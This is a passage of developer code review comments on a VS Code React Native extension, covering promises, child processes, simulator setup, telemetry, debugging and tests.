as we discover more requirements.\n. If the commands are run in the debug adapter, then printing to stderr will make sure that they are shown differently in the debug console output. Right now we seem to write both stderr and stdout of the child process to stdout. I don't think that this works for the command output window in-process though.\n. Will we be adding support for android devices in future? Or is that already handled by react-native?\n. Do you anticipate this becoming more complex in future? If not, may as well construct the command string and invoke the argument within the one promise\n. What exactly does outDir do? If it is just intended as a compilation parameter for if typescript is involved, then maybe leave it out?\n. Do we anticipate any more complexity for android? I'm putting the iOS code in src/debugger/iOS/ since there's a few files involved, perhaps android should be in a subfolder for consistency even if it is just the one file?\n. But what is it intended to mean? Is it the root of the project that source maps are expected to be relative to?\n. If we do that, then it should be changed to .getDependency(\"react-native\") which can return a not found value or reject or something\n. Sounds good to me; I'll change mine before the PR.\n. When I was trying to fix this issue, I was of half a mind to change the exec function to reject with just an error, but I wasn't sure whether stderr would be necessary at times. If we make sure that all rejections reject with errors we avoid this issue, if we allow arbitrary rejections then the error handling code can't make any assumptions about how to present the error.\n. This is more of an assertion, \"this should never happen\" and if it does I'm not sure what we can do other than say so. It's more of a debugging aid or documentation than something intended to be shown to the end-user in some circumstance.\n. These are two different entry points into the IOSPlatform class, and the target parameter is optional in both cases so we need to provide a default. Would you suggest a private parseOptions(launchArgs) method to do this default-setting?\n. As far as I am aware. The single folder that is unknown in the middle there is a GUID-like name, and can vary between deployments of the application.\n. I have not yet seen a scenario with multiple candidates, and I hope that it is not actually possible since the filename is based on the bundle ID and I don't think you are allowed to install multiple apps with the same bundle ID. If we do happen to find multiple instances then I also don't think that printing the files would be helpful. Is your app 2F1E4FC0-81FD-11DA-9156-00036A0F876A or 38A52BE4-9352-453E-AF97-5C3B448652F0? I don't know, and I don't think that any end-user can reasonably be expected to know either.\nThis is definitely a case we need to add telemetry for once that is in, but for now I think that it should never actually happen.\n. I think this could do with a better name, and it's not clear to me that this is an appropriate initial value. Should it resolve immediately, or should it start in an unresolved state?\n. Should this be made async?\n. Can you please clarify this comment? Do you mean that it replies synchronously?\n. Can you add some more explanation here? If we have a response from the script, what else would we be waiting for? Can the script respond before it has finished loading?\n. Do we also need a rejection handler to reject the case of a script error?\n. Do we need an onerror handler or something as well?\n. What kind of scenario are you considering here? 100ms seems very small, and it looks like it will only retry once?\n. I think you should create the socket before the worker, although the potential race condition will probably not happen due to the single threaded nature of javascript... Although what happens if you try to send to a socket that is not yet opened / has been closed?\n. Looks like you don't re-create the sandbox yet? Is the prepareJSRuntime message the first message that the app sends, or is it only sent as a \"refresh\" type command?\n. Should this be referring to Packager.DEBUGGER_WORKER_FILENAME?\n. I did that initially, but then erred on the side of reducing nesting depth.\n. Moved to the FileSystem class and made generic\n. Good idea, I didn't notice the getErrorMessage function.\n. I'm inclined to change the contents of this to return Q.nfcall(fs.writeFile, filename, data) rather than trying to set something like writeFile = Q.denodeify(fs.writeFile) even though that's more specifically what we want. It's just a little harder to fit as an instance method of a class like we have here.\n. I disagree, since other than\n- the username,\n- the emulator GUID,\n- the app GUID,\n- the app bundle id\nall the information is static and known, and none of those pieces of information are helpful for working out why the plist file isn't found.\n. Is it possible to distinguish between stderr and stdout in a vscode output window?\n. Perhaps private pendingScriptImport: Q.Promise<void> = Q(void 0);, and later on it is extended via something like this.pendingScriptImport = Q.all([this.pendingScriptImport, newScriptPromise]); so it always completes only when all currently pending imports complete?\nAlthough what should happen if an import fails? Is it possible to recover? What happens if an import has a syntax error and is unparsable?\n. But it is re-sent on in-app refreshes, right? In that case would it make more sense to not initialize the singleLifetimeWorker until this call comes in, and have this call always create a new one?\n. In that case chaining the pending imports together as I suggested above is probably a bad idea, so we should just keep a reference to the latest one. The importScripts function can avoid messing with Q.deferred and instead just assign the result of the ScriptImporter invocation to this.pendingScriptImport\n. I spoke with @meenakb about this, and I think the previous approach was based on faulty assumptions about the lifecycle of a react-native project. Especially because we don't provide a way to construct one (you need to do that via the command line) unless someone manually copies a project over, the 99% scenario will be someone opening a folder that is already a react-native project.\n. Should we enable these commands even if we are not properly activated? If we don't, they'll show up in the list (since we declare them in the package.json) but they will fail if you try to run them I believe.\n. No, the dropdown is populated based on launch.json and we don't generate that dynamically. Right now we just have \"launch ios\" and \"launch android\". For iOS we can ask react-native to launch for a particular target simulator, but it looks like run-android does not accept a similar parameter, so I feel like we should document that it is a supported feature and mention how to use it (include a second parameter in the launch.json arguments which is the name of the device to simulate on) but not worry about making it super obvious in the IDE without reading docs.\n. In a function with void return type, I feel like we should avoid return (thing evaluating to void) since it tends to confuse me for a moment until I go to the end of the line and see e.g. the .done()\n. I've left this method as generic and added a more specific method for dealing with xcodeproj files.\n. We don't append ios to the working directory when invoking xcodebuild. I think that I prefer consistency in what is being passed around (basically everything needs the path to the project) rather than perfect specificity here, so you don't need to work out whether it is the path to the root or to some subfolder etc.\n. Are these typings intended to be added piecemeal based on usage (in the same way that the Cordova plugins were) or will it always be all or nothing?\n. Do we want to be able to call getOrCreateTypingsTargetPath(null)? If not, I'd suggest removing the conditional here and allowing the path.resolve to fail so we catch these errors closer to the root cause.\n. When we are running in the vscode process we should try and avoid synchronous blocking operations. I doubt it matters much for writing 2 bytes to a file, but I think it's still worth promisifying.\n. Does this typecheck? Looks like you are returning void here rather than a promise.\n. Yes that's what I was going to propose. The complexity made sense for Cordova, but here I think it is unwarranted.\n. I see that you've changed the return type of this function, but I don't see where you make use of that. Is it necessary?\n. The change also means that the promise resolves immediately rather than waiting for the process to terminate which was the previous semantics. Is that intentional?\n. I'm a little hesitant about this change because elsewhere we've used CommandExecutor.spawn to kick off a task and await its completion. I do like the change you made to utils/node/childProcess to return the process; how do you feel about directly using that since you need the process? That way CommandExecutor is a \"fire and forget\" kind of function, and for finer grained control we have childProcess?\n. Also just noticed: this.start will be invoked with a different this object when the timeout triggers, I don't think that is intentional.\n. Some parts of it need to be substituted at runtime (specifically the launcher path) so we can't just copy a file, we do need to modify it. We could bring in some of the stream editing code to do that, but initially this was even simpler than this and so it felt like overkill.\n. Actually it looks like it isn't returning promises in the map when I think it perhaps should be?\n. I think that this can wait until we support iOS devices properly. You are probably right that we'll need to make it stand out a little more in all the chaos of the packager output, but rather than making changes now I'd prefer to see how it actually looks and make changes then.\n. They do all fit that schema, but I'm not convinced of the benefit of a\nprivate runPLBCommand(command, target) { return new Node.ChildProcess().exec(${executable} -c '${command}' '${target}').outcome;}\n function\n. Looks like there's one indent too many here\n. Does this run the onmessage in our context, or the sandbox context?\n. This actually isn't needed since typings are in src/typings now\n. I think this should be path.join(this.projectRootPath, \".vscode\", \".react\"); to make sure we get platform appropriate path separators.\n. Should we make sure to do this async, and also to use our FileSystem class here?\n. Does this have to be synchronous (e.g. is the process exiting right now) or can we be async here to not block other extensions cleaning up?\n. Might be better to (path.posix || path).join.apply(null, p.split(path.sep)) or equivalent?\n. From my understanding of the ReactNativeCommandExecutor, we actually should just be doing .executeReactNativeCommand(\"run-android\") here, and the ReactNAtiveCommandExecutor deals with the reactNativeCommandName business.\n. I believe there's one more place that needs updating, but that case isn't used for launching react-native itself. Have a look at debugger/ios/compiler.ts\n. Is it \"unix style\", or \"URL style\"?\n. Why not have this as a static variable?\n. Do we need all these files from the sample application checked in? For cordova we just had the \"user project\" stuff checked in, and we would cordova platform add when necessary. Is there a similar workflow for react-native we can use?\n. Actually I think it might be possible: I just tested it out, and if I deleted the ios folder and ran react-native upgrade it regenerated it, and I was able to build successfully. react-native android already generates an android project, so I think we can avoid including either of those folders in the checked in code, and we can generate them as required on our dev machines (or as part of tests if it comes to that)\n. I just noticed that this references a .map file: why is that? We don't do that for the auto generated one do we?\n. Unfortunately I think that path.posix exists on windows, but not on mac/linux (where it is the default), so we do need to check.\n. I take it that these timeouts are no longer required? Is that because of changes we have made, or it just seems to be ok now?\n. Since we can now refresh the app if it fails to connect fast enough I think it's fine to do a best-effort here as you do with the pre-warming.\n. Perhaps it's node dependent then; I checked on an older version. If it exists then it's all good :)\n. This doesn't seem to be used, is that right?\n. If you are going to overwrite if it differs, may as well skip checking if the file exists and reading it and just go straight to writing the file.\n. Once we move into a proper debug adapter I completely agree. Since right now we are in a strange state of having our code in the actual debugged process, when you hit \"stop\" we won't get a chance to run any more of our stuff so I think this is the best chance to clean up after ourselves.\n. I was doing that first, but the scenarios are slightly different. I think in this case it might work out, but in a few of the cases we don't want to wait for the process to terminate before continuing on, so the promise that the commandExecutor returns isn't what we want.\n. You can just ignore the whole .react folder I think.\n. We currently don't place the launchReactNative.js file in the .react folder. I don't know whether this was intentional however.\n. The way I handle this currently we reject the promise immediately, which ends up printing the error / stack trace immediately as well when there can be a little bit of output afterwards. Do we think it'd be better to defer the rejection until the command finishes?\n. I should note, the reason we have to do this is that \"react-native run-ios\" will have a successful exit code even if it fails to launch the simulator.\n. Is this file included/excluded by the .vscodeignore? I believe that currently we exclude everything in /src and just include things in /out\n. Is the idea to only monkeypatch when we want to launch? I thought that we were planning on patching it on activation, so any external launches of the packager would work with us as well, as long as the environment was set appropriately?\n. I'd suggest path.resolve(path.dirname(destnFilePath), \"package.json\") rather than resolving a file with ..\n. That's true. However I believe we will be requiring people set an environment variable to get intellisense working, so we may mention both variables in which case perhaps we should prepare the project as soon as it is opened?\n. Yes\n. I don't know about other commands, I just noticed with this one. Sample output looks like\n\n. That is rejecting the promise immediately. The lines after the stack trace are further output from the command that was run.\n. The sequence of events involved in react-native run-ios is approximately\n1. Start a simulator (may silently fail)\n2. Build the project\n3. Install the app on the simulator\n4. Run the app on the simulator\nSteps 3 and 4 there are the ones that can fail noisily without causing a failure error code. Step 3 will fail if there is no launched simulator, and you get the image shown above where it continues onward to try and launch the app which also fails. Step 4 will fail if the app was built for one target (e.g. iPhone 6) and is running on a different simulator (e.g. iPhone 5) and it looks like this:\n\nBecause the failures are right at the end we there's not much of a difference between waiting for the process to exit and rejecting the promise immediately.\n. If message is guaranteed to be non-null then I agree\n. If we host the server in the debug adapter like this then it's a little awkward, since we would need the extension process to make a connection whenever the debugger launches, and I'm not sure if there's a good event for that.\nWe could host a server in the extension process and have this connect to that to find the node debug folder, but we still need a way of getting this adapter process to reset breakpoints, so we'd end up with some kind of socket server in the extension process that forwards messages between the code being debugged (specifically the script importer) and the debug adapter.\n. I'm not sure that the end-user can specify command line arguments for the debug adapter in a convenient way. We might need to also hook the \"launch\" event to reads the arguments sent over, and only then create the listening server.\n. I would love to put in some nice error messaging, but I'm not sure how to actually communicate back. We don't have a proper debug adapter channel going until we invoke DebugSession.run at the end of this file, so I don't think we can send a message over the debugging protocol. I can try printing an output/error type message to stdout in the hopes that vscode picks it up even if it isn't part of the standard sequence of things.\n. Personally I prefer not to: I've said it before, but my view of .d.ts files are as a kind of public interface (with varying levels of public). These typings are very much a hack and I wouldn't really want other things to make use of them. \n. I think that we should keep the file somewhere in the extension rather than a project-local path, since until we start a debug adapter it is difficult to know where the project is.\n. That seems reasonable to me\n. What happens if the property doesn't exist already? does it error out if you delete a non-existent property?\n. This won't work unless the app has been run (in the same simulator) previously because it won't have generated the plist file yet.\n. Oh nevermind, I see that the following line deals with that since if the file doesn't exist then it won't be in debugging mode.\n. Done\n. We may be able to remove this requirement, but I'm not 100% sure that we get the project directory at this point and things work as they are. For vnext we can most likely remove the need for the launchReactNative.js stub entirely.\n. Nice catch there.\n. Should this be private?\n. Will there also be a \"No\"/ go away button?\n. I think unless we need the this parameter to be cared for, I prefer Q.nfcall(child_process.exec, ...) over Q.ninvoke(child_process, \"exec\", ...) so we can get some stronger type inference.\n. I don't think this is necessarily warning-worthy: If you say to run-ios and you've never configured the simulator to be in debug mode, then setSimulatorJSDebuggingModeSetting will reject the promise, and that is working-as-intended.\n. Do you think that a warning is appropriate? In a normal react-native workflow there's no prewarming and you end up with a bit of a wait when your app starts. If we fail to avoid that, it's no worse than the standard react-native experience isn't it?\n. Should we enable telemetry earlier, around the start of this file, so we can report errors encountered in the initial setup above?\n. I think that this .generate needs to be followed by a .done() now that executeCommandInContext returns a promise rather than completing it.\n. Should we wait for telemetry to be activated before setting up the rest of the extension? That way we can report things like whether salsa was enabled etc\n. This is a \"normal\" react-native scenario though isn't it?\n. It is also the same as TACO.\n. Since all our telemetry goes to the same location as the vscode telemetry, they requested that we don't prefix things with vscode since it is redundant.\n. We could add some telemetry here to see if our async setup of debugging has issues.\n. Here is another place we could add telemetry to catch issues with version changes in the node debug adapter.\n. This looks weird to me, considering the next line is another fat-arrow function and it doesn't remove the indent\n. This error should be bubbled up to the top level and hit the telemetry generator which reports it I think?\n. Yes, but the process.exit outside the finally is not supposed to be there.\n. beforeExit only happens on \"normal\" exiting, not from process.exit so that won't work\n. They are different events, so we can distinguish them in that way.\n. I think we can leave this out since android and ios are the only platforms supported by react-native itself.\n. I think we want to recommend that people configure their machine / project up front, and the prompt is only for if they fail to do that\n. The 'default' as in what we use if launch.json doesn't specify anything is actually 'iPhone 6', since that is the default that react-native uses\n. We should note that this uses the default simulator which is the iPhone 6\n. I thought that we never intentionally delete these files and so updates wouldn't impact them?\n. Perhaps we should also mention the way to switch the file to JSX colourizing\n. Typically it's been via github issues, or us reaching out to them on stackoverflow etc\n. We should also probably resolve or reject in an else handler; if signal === \"SIGTERM\" is that successful or a failure?\n. I'd prefer that logic to be more specific to the packager rather than in the general \"spawning a process\" logic personally\n. Can you please include an example of the kind of thing this is supposed to match?\nWould it be simpler but still correct to replace those (?:.|\\n)*? with [^>]* ?\n. When will the default location not have the manifest? Is this a user configuration thing, or are you simply being cautious?\n. What happens if the manifest is malformed? Does the build fail? If so what do you think about us rejecting rather than using a default in these cases?\n. But will it work with react-native run-android or do you need to adhere to some conventions for that to work?\n. You can do it on a typing level with something like <Q.Promise<void>><any> but that's just lying; this is a way to make it actually return void. An alternative is to have the function return Q.Promise<any> and treat that as \"arbitrary, you can't depend on what this is\".\n. That fails with \"0.2.0\" >= \"0.19.0\", though I don't know if anyone is going to be using a version < 0.10.0.\n. In other projects we've referred to os.platform() rather than os.type(), is there a reason for using os.type here?\n. I suggest using our node wrapper here to isolate the dependencies on the \"child_process\" package\n. Any reason not to do this as an import up the top? I believe right now tslint will complain at you for this.\n. I suggest going back to just importing the type here to avoid accidentally using child_process directly\n. is this TODO accurate?\n. Typo: testProjcet\n. The event will have been queued via the generate above, we just need to make sure to wait for the pending data to finish before calling process.exit. Of course that won't protect us from the process being terminated if the session ends, but hopefully appinsights can pick things up next time it starts.\n. Could also happen if the project has a package.json but has not been npm installed yet, right?\n. Looks like you added a file you should not have\n. Right now this will double-log the failure, since this handler and the one in spawnChildProcess will both fire.\n. I feel like this should be changed to a Q.Promise<void>, and non-zero exit code should cause a rejection.\n. Looks like this has been included accidentally\n. This one too\n. This promise is never resolved, only rejected. We might need to re-examine our workflow around here.\n. The port should be configurable, but that configuration will need to be communicated from the extension process to the debug adapter somehow. I suppose in the worst case we can ask the user to specify it in two locations: settings.json and launch.json?\n. I see that setup returns a promise, but you don't care about the return value here. Should we be waiting until the server configures successfully or otherwise informing the user that something has gone wrong?\n. The debugger process could try and parse settings.json in the project, but the settings as seen by the extension is a combination of a global settings.json and the project's particular settings.json file, and replicating that logic could be messy.\nWe could try to have the extension parse the launch.json since we would already require that they all have matching ports (otherwise some configurations would fail) so that might be workable.\nWe also need to make sure that the server is restartable (since it's registered with the context that might be enough) so that if the settings/launch.json are modified by the user we update the port the server is listening on.\n. Ah, I was not aware of that command. It seems to work much better and means we do not need the arbitrary delay any more I think. I'll test it some more to be sure. Thanks!\n. Don't we still need the preLaunchTask to make sure that tests are compiled before running them?\n. What's this folder? Is it something that vscode creates when it runs the tests?\n. Is there much of a difference between \"tdd\" and \"bdd\"? I see that you are using suite and test rather than describe and it, are they functionally the same?\n. This assignment is irrelevant / does nothing, since it is just an argument passed in to the function. This function can just return a promise in each of the branches.\n. Copyright header\n. Now that logWarning prepends warning to the message we shouldn't include it here.\n. I would suggest rejecting with an Error object that includes the code, so error handling code can be more consistent.\n. Considering we own the client and server components and they will be updated in-sync, I am inclined to keep it simple for now and only add complexity when we have a better idea of what we need. We don't have to worry about backwards compatibility so refactoring later won't be much trouble.\n. My first instinct is that we should pick an approach and go with it: Either a socket protocol of sorts with particular formatted messages on the wire, or a HTTP protocol where we use URLs and the body of the request is minimal.\n. Is this warning correct? (Also should this use logWarning ?) If the user has run the start packager command from within vscode, when we go to debug it it will have already started and so this will warn erroneously I believe.\n. Surely a fatal error is an error not a warning?\n. Use \" quotes rather than interpolating backticks if there is nothing to interpolate\n. This line confuses me. You wait for the deferred to resolve, but you also resolve it when the second promise completes as well?\nReally this method does not want or need a promise from the CommandExecutor, it is managing the child process lifecycle completely and dealing with the other promise just confuses things.\n. Do these need to be sequenced, or can they be done all at once? Perhaps\nQ.all([enableSalsa(), installTypescript(), configureWorkspace()])\n    .then((result) => warnIfRestartIsRequired(result.any((x) => x)))\n. errorDescription isn't used anywhere\n. I think that if it is possible, this should still be a TelemetryHelper.generate to avoid having too many different kinds of telemetry events\n. Typo in var name: I assume this is meant to be isDebugeeProcess as in the process being debugged, rather than the debug adapter or the extension process?\n. codeToRun is actually already executing since it is a promise. Why not merge runCode into this?\n. I would also suggest errorsAreFatal rather than areErrorsFatal since it flows better when used in my opinion.\n. I'm inclined to change this for a proper Error class which has a stderr property, so we always reject promises with Errors.\n. This rethrow will be trapped in a  promise context. You'll need to add a done to rethrow it properly.\n. Is this actually a fatal error? We are trying to clean up, but it is not strictly speaking required\n. Not the way the code is currently set up. Right now if you haven't run the app before, setSimulatorJSDebuggingModeSetting will actually reject after 10 seconds or so of trying to find the file, but that is 'working as intended'\n. You still need to add in the ability to pass on the port read from launch.json, right?\n. This is currently conflating 2 different launch args: The original ILaunchArgs here was arguments-as-interpreted-by-debugee, and was constructed based on command line arguments. The new interpretation adds in arguments-as-specified-in-launch.json which is slightly different.\nFor example the args property is the nodejs debugger args property which we use to pass arguments to the debugee process. I think that we should avoid mashing the two together because they are used in different ways.\n. Note that the \"default\" specified here is only for documentation. We need to ensure that our code copes with missing values and explicitly set a default.\n. Oh, You have added in the pass through, it just isn't used here or further above yet\n. I believe that we also need a file watcher or to hook onto some vscode event if there is one for launch.json updating. If the user updates the launch.json we should restart the server respecting the new value\n. try/catch with a 404 on invalid JSON?\n. On closer inspection, you have added code below to receive the port, but not yet added the code to nodeDebugWrapper to send it through. See https://github.com/Microsoft/vscode-react-native/pull/76/files#diff-933d1a6506e93a563f1ed6dc80ff0f47R126\n. I would suggest also adding in default-setting logic here to avoid any issues with unexpected input since it is user-exposed. That would also prepare it for when we move the bulk of the initialisation code to the debug adapter and so the value would be consumed here as well.\n. I did it this way because the actual value/type is user provided. Initially I had said that it was a number, but then I couldn't parseInt even though it works fine at runtime to ensure that we end up with a number.\n. I agree, this name feels incorrect\n. What do we do with this? There's no way to extract it, and it looks like it isn't included in the stringified version\n. Is this changed intentionally? I don't think I've ever messed with this before.\n. Yes; if an error event happens then something has gone wrong and I'm fine with it failing the task until we fix it, and if the process end is called afterwards then it'll just fail it even harder.\n. I'm inclined to agree with Daniel. Potentially we could make the return type an IMessageResponse type which is an opaque {} type, but I think any is just about as good.\n. Perhaps change the function to accept Console | OutputChannel | WritableStream and have checks for targetChannel instanceof Console etc?\n. And perhaps instead of returning a type, what if you returned a writing function that did the right thing? e.g.\nif (targetChannel instanceof Console) { return (message) => targetChannel.log(message);}\nif (targetChannel instanceof OutputChannel) { return (message) => targetChannel.append(message);}\n. Although actually we probably don't want to change to instanceof checks, because if you do targetChannel instanceof OutputChannel then you'll have to import OutputChannel from vscode and that will break the out-of-process side of things.\n. Why have this additional level of indirection, and not just directly expose getFormattedOutputChannelString?\n. What about instead of accepting targetLogChannel: any, this function took a logFunction: (message: string) => void as its argument, and the caller is responsible for providing that function? That way this class gets much simpler, and we can support more options (such as when we move some more functionality into the debug adapter and we need to send output via certain messages in the debug protocol).\n. In future we may enable multiple languages, vscode is becoming localized.\n. How do you suggest doing that? We want to test that a particular function is called twice with different arguments in the right sequence. Would you prefer if the function replaced itself, something like\nmockExec = { exec (...) => { if (args.bad) { fail } else { mockExec.exec = step2; return}} and then step2 is another version that again validates arguments and replaces itself with a failure function?\n. You should reject with an error not just a string\n. This doesn't actually do anything to the worker; do we need to actively stop it (e.g. what if there's a timer running in the worker)? And what about the websocket connection, should we close that, or we wait for the other party to end it?\n. You mean this._extras, otherwise it's an infinite loop.\n. Yes. The code will check as many paths as there are entries in the directory (in this case we return appIds so one path for each of those) and we are saying that only one of those will be populated.\n. That's not inherent to the class though, that's just instance of how we use it at the moment\n. Why is that? Looking at this function in isolation if devices is null then the next line will throw an exception\n. The current code is robust in the face of null devices, unlike your changes. Do you have a strong reason to oppose the current state of things?\n. The difficulty with using cluster like that is the debugging; the different members of the cluster are different processes and so we won't be debugging the thing that runs the code any more. We could manually do something similar though where we download the bundle.js and bundle.map.js and then explicitly fork a node process and attach to it for debugging.\n. findXcodeprojFile only gives the filename of the xcodeproj file, not the full path.\n. But this way they are scoped down in where they could possibly be used, wheras if they are member functions they could be used anywhere in the class. Personally I like this way better.\n. It is a gulp task, it's just not an anonymous function. As for why: That's how it was when I found it. I don't think there's a particular reason for it.\n. Filename case mismatch as found by prebuild task!\n. Small grammar issue here; should be \"so the extension installs\" or something similar?\n. Do we want to explicitly forbid newer versions of typescript? I suppose this would only impact someone using an older (current-day) version of vscode with a newer (future) typescript version installed. And not only that, it would have to be in the same spot that we install to, which seems unlikely.\n. We've tried to avoid directly calling child_process in favor of using our own common/node/childProcess wrapper that already promisifies things. It should make things easier for testing in future since we know that all side effects (running processes / messing with filesystem) go through just a couple of locations.\n. Should we be attempting to recover from this failure, or should we let it fail the \"prepare the project for salsa\" sequence and report that failure at a higher level?\n. Since fileSystem.exists already returns a Q.Promise<boolean> you don't need to wrap it in a Q.resolve here\n. Since JSON.parse is synchronous (and actually returns any not Q.Promise<any>) you can just merge this into the next step in the promise chain as const data = JSON.parse(jsonContents); return data.version;\n. You don't seem to actually do this, the patterns you pass in are plain strings, even in the case of iOS at the moment.\n. Oh nevermind, I missed where you modify the success pattern.\n. Now that these are split up, we should give different errors... Although these both stem from not launching the correct emulator. The first case is when there are no emulators launched, while the second is when an incompatible emulator is launched.\n. Perhaps null out this.output and this.errors after trying to parse them so they can be GCd in the case of large output?\n. Should this be using this.deviceHelper instead of creating a new one?\n. Please add a comment stating that react-native run-android installs on all devices, but fails to launch on them despite reporting success, and thus we manually launch if there is more than one device attached. Once/if they fix that, we'll need to revisit this I suppose.\n. What kind of arguments are valid logCatArguments? Looking at the docs, logcat takes a bunch of things potentially, so I might expect to provide an array of arguments to pass to it and that won't work with the way things are set up here.\n. Should we stop logcat once the debugging session ends as well?\n. Where is this used? I don't see it anywhere.\n. I mean that [1,2,3].concat([[4,5,6]]) = [1,2,3, [4,5,6]], and since in this case these are arguments being passed via argv I don't think we can pass an array as a single argument.\n. Perhaps we should JSON.stringify and JSON.parse? I believe that should work out as long as the options aren't very large.\nThis is another issue that will go away once we move more stuff out of the debugee process though.\n. What happens if there are multiple calls to createOutputChannel with the same argument? Does the channel get re-used, or do multiple with the same name get created?\n. I believe that these classes are \"vscode-aware\", in that they do things with OutputChannel at the type level but should not actually end up require()ing it at runtime. If we can abstract that detail out by passing around an ILogger instead, that would lead to less chance of accidentally referencing OutputChannel in a way that caused it to be required.\n. For consistency should we create the ReactDirManager at the same time/scope as the ExtensionServer?\n. In the debug adapter, yes: there's a termination message that we can handle.\n. Should logWarning call getWarning internally? Or are there cases where we'd call one without the other?\n. As long as OutputChannel is only ever used in a type context, and the emitted javascript has no cause to reference   it, then it should be fine. But that can be a fragile balance.\n. What is the default logging behavior inside the extension process? Prior to this change, all these messages go to whatever outputChannel is passed in (which I believe is one created specifically for the packager) . Now that you are removing the outputChannel here, the \"starting packager\" message will go to the default location, while the process output will go to the passed-in channel. Is that a conscious change?\n. LogHelper is common between the extension process and the debugger process though, and the latter doesn't have easy access to vscode settings\n. Unless you are intending to read specifically the .vscode/settings.json file, but that would exclude globally-configured settings.\n. So what is the default global output location for inside the extension process? Are we intentionally coalescing output from the packager and all other sources together now?\n. Right now this will try to JSON.stringify an Error object, but most of the interesting properties are non-enumerable so this won't work right.\n. this.isRunning() returns a promise, so I think right now the result will be ignored and we're just checking the non-nullness of the returned promise which should always be truthy. If we want to check if the packager is running then we'll need to wait for the promise to resolve\n. Nit: Some inconsistent spacing here\n. Writing to stderr won't be visible to anyone, but I also think it probably shouldn't mess up the debug protocol so this may be ok to leave as-is.\n. This needs to set process.exitCode as well, or otherwise make sure to return true so it gets picked up by the next stage.\n. Does this persist outside the executing process, in this case the child-shell which ends almost immediately?\n. Are we assuming that USERDNSDOMAIN exists only on windows now? Or does it not matter?\n. Is there a reason you have these down the bottom rather than toward the top? The code above this is executed immediately, and I find that having function definitions afterwards makes that harder to notice.\n. How does that $(briefcase) bit work? Is there a set of permissible images, or is that a unicode character or something?\n. Should we delay this until we activate properly? My understanding is this will add it always, rather than just for react-native projects\n. Ah sounds good then!\n. Very cool. [bikeshedding] Perhaps https://octicons.github.com/icon/package/ instead of the briefcase? [/bikeshedding]\n. Rather than that, why not stub the message, and use stub.calledWith(thing it should have been called with) to verify it was invoked?\n. This looks great for cases when the packager fails to start properly. In cases where the packager falls over later on will we catch it? Does the retry logic on disconnect mean that we end up back in this case anyway?\n. Won't removing the {} change the scoping of the let statement? Is that deliberate?\n. I'm not super happy about this, but I'm not sure how better to deal with these cases: We have some asynchronous operations that do not wait for a specified point in time and aren't chained into accessible promises, so to check that they happen I've just been waiting a minimal period of time to ensure that async operations have a chance to execute.\nAn alternative would be to explicitly wait on the callbacks that I expect, does that seem like a better approach? However in the case that they don't get called we end up with a timeout rather than a failed assertion.\n. We need the declaration outside the suiteSetup so it is visible within the tests. In this case the assignments could be delayed to the setup, if we wanted to separate definition/declaration.\n. I wouldn't use postinstall. Partly because it is not recommended in general, and partly because it happens at the wrong point in the lifecycle. prepublish might be better... The reason that it worked in postinstall for TACO is that was for the repo itself, which wasn't actually \"really\" a package, wheras this  repo is.\n. I think the best approach would be instead of having multiple optional positional arguments, go with a named-option-bag approach, so you'd pass in {level: InternalErrorLevel.Warning} etc, but that's for another PR\n. I would suggest renaming this variable from retryAttempt to something like warnOnFailure to better represent its usage.\n. Even though this is technically a single statement, I would suggest including the braces since it is a bit long and I could see things accidentally breaking if someone adds an additional statement but forgets to add a return\n. Should you invoke callback with an error argument here as well?\n. The problem with \"turn spawn into a promise friendly thing\" is what exactly does that promise do? Is it just return Q(child_process.spawn)? If that's the case, then it's not really worth promisifying. Promises are for asynchronous things, and the current informal spec here is \"return a promise which is rejected if we fail to launch it (~= the process asynchronously emits an error event within the first 300ms) and resolved otherwise on the assumption that the process was successfully started\".\n. Returning a value in a done() handler won't have any effect I think; what is this supposed to do?\n. I just saw that this deferred is not actually used, looks like a bug. Apart from that, I think that this is manually implementing the waitForExit: false case, so perhaps it should just be returning the outcome promise?\n. Since we now still use the default getExtensionPipePath value for this, is the stub still needed?\n. I would suggest using the 2-argument form of then here rather than throwing an exception in the first then and then filtering it out in a common catch\n. You don't need to do any of this; you can just\nimport \"should\";\n. Does the \"process\" package actually exist? I thought that process was a global\n. I tried it out on node 0.12.7 and the \"process\" package doesn't seem to exist there.\n. Why are you adding these now when you aren't touching anything else?\n. My understanding is that this is intended to be debug-mode-only, and in a production scenario it is expected to throw an exception because statSync will fail to find the file. If we want to log exceptions, we should check for the map files in a way that won't throw an exception when they are missing.\n. This won't include the common tests, which are also run in a debugger context as well.\n. I assume that you've tested this works? My first thought was this might be using javascript's strange declaration semantics where you can do var x = x; without complaints, but the variable is undefined because it was assigned to itself.\n. Oh nevermind, they are different identifiers and I just completely missed that.\n. Why have this class know about how the package class accesses the file system rather than having giving this class a mockable way of creating a Package?\n. Why is this lower cased in the first place? I thought that we intentionally removed some lower-casing because package names are actually case sensitive?\n. Why not also take a generic parameter U for the return type instead of enforcing null?\n. It can't be a simple relation, because the vscode npm package is currently 0.11.9 which doesn't match up with any vscode proper version. The package is only typings, but they could definitely get out of sync with each other...\n. This is to let us distinguish between internal and external users. For windows machines it's done based on whether the machine is domain joined, but for macs there wasn't a standard way of determining this, so we went with defining an environment variable so we can opt-in our own machines to being an internal user and including additional info.\n. Why are these any typed rather than crypto.Hmac and string respectively?\n. Are we intentionally generating / tracking user IDs when vscode does not? It looks like vscode tracks machine IDs and session IDs and sqm IDs, but not user IDs. Since we can't correlate this data with anything other than more of our data, it might not be worth including it.\n. Indentation\n. Do we still need this now that we are using the vscode-extension-telemetry package?\n. Is this fully correct? I think that this will attempt to allow iOS builds on linux which I believe will fail just as much as on windows.\n. I don't mind it as it is, but perhaps something like supportsTargetPlatform(targetPlatformName: string) so it reads as if (hostPlatform.supportsTargetPlatform(platform)) { ...}\n. Why initialize this here rather than in the constructor like we do elsewhere?\n. The \"default\" parameter should refer to what the code does if you do not specify the parameter, and thus the default for sourceMaps is actually false.\n. Ideally we should do away with this parameter, but that's a bunch of work that we don't have time for at the moment. This is a good interim fix.\n. If the source has multiple sourceMappingURL entries, that is a violation of the spec and the source must be cleaned up (There is a babel loader called something like strip-sourcemap which does this I believe). If we want to try and support non-compliant pages, then my suggestion would be picking the last sourceMappingURL, not fuzzy matching on the assumed name.\n. Should this be addressed? Or have a task / issue created for it?\n. Are they aware of this bug, and could we take a newer version to work around it? Link to issue?\n. Why not require.resolve('source-map-support/source-map-support.js'); ?\n. This feels pretty hackish, and I think I'd honestly prefer to deal with JS traces than have known-buggy hackishly-patched code to make TS stack traces work\n. Just to make sure I understand correctly, these two path.basename changes are so if the packager gets a request for http://localhost/foo/index.bundle.ios it will search in .vscode/.react/index.bundle.ios and not .vscode/.react/foo/index.bundle.ios, is that right?\nIf that is correct, then while this wouldn't work for multiple apps running 